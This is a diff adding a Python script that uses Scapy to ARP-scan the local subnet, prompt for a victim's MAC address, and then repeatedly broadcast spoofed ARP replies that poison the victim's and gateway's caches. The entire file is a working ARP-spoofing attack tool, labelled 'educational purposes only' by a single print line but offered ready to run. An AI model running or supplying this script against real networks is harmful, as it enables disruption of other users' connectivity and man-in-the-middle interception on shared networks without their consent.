@@ -1,0 +1,97 @@
+import os
+import time
+from scapy.all import *
+
+def network_cardpick():
+    global netcard
+    from scapy.all import get_if_list
+    print("Available network cards:")
+    for iface in get_if_list():
+        print(iface)
+    netcard = input("Please enter the network card you want to use: ")
+
+def get_wgip():
+    global iip, wg
+    cmdcode = 'route print'
+    wg = None
+    iip = None
+    for line in os.popen(cmdcode):
+        s = line.strip()
+        if s.startswith("0.0.0.0"):
+            iplist = s.split()
+            wg = iplist[2]
+            iip = iplist[3]
+            break
+    if not wg or not iip:
+        print("Failed to retrieve gateway or IP. Exiting.")
+        return
+
+def basinfor():
+    print(f"Netcard is: {netcard}")
+    print(f"IP is: {iip}")
+    print(f"Gateway is: {wg}")
+
+def arpscan():
+    global target_mac
+    global ansersip
+    ansersip = []
+   
+    try:
+        arppk = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=wg + "/24")
+        ansip, unansip = srp(arppk, iface=netcard, timeout=5, verbose=0)
+    except Exception as e:
+        print(f"Error during ARP scan: {e}")
+        return
+
+    for s, r in ansip:
+        ansersip.append([r.psrc, r.hwsrc])  # IP, MAC pairs
+    ansersip.sort()
+
+    print("Found devices:")
+    for idx, (ip, mac) in enumerate(ansersip):
+        print(f"{idx + 1}. IP: {ip}, MAC: {mac}")
+    target_mac = input("Enter the target MAC address to attack (e.g., 00:11:22:33:44:55): ").strip()
+
+def scan2():
+    global target_ip
+    target_ip = None
+
+    try:
+        arppk = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=wg + "/24")
+        ansip, unansip = srp(arppk, iface=netcard, timeout=2, verbose=0)
+    except Exception as e:
+        print(f"Error during ARP scan: {e}")
+        return
+
+    for s, r in ansip:
+        if r.hwsrc.lower() == target_mac.lower():
+            target_ip = r.psrc
+            break
+
+def attack():
+    arpscan()
+    while True:
+        scan2()
+        if not target_ip:
+            print(f"Target MAC address {target_mac} not found in the current scan. Retrying...")
+            time.sleep(1)
+            continue
+
+        print(f"Target IP for MAC {target_mac} is {target_ip}. Starting attack...")
+        try:
+            sendp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=target_ip, psrc=wg), verbose=0)
+            sendp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=wg, psrc=target_ip), verbose=0)
+            print(f"Attacking target: IP={target_ip}, MAC={target_mac}")
+            time.sleep(0.5)
+        except KeyboardInterrupt:
+            print("Attack stopped by user.")
+            break
+        except Exception as e:
+            print(f"Error during attack: {e}")
+
+if __name__ == "__main__":
+    print("This script is for educational purposes only. Ensure you have authorization before using.")
+    network_cardpick()
+    get_wgip()
+    basinfor()
+    attack()
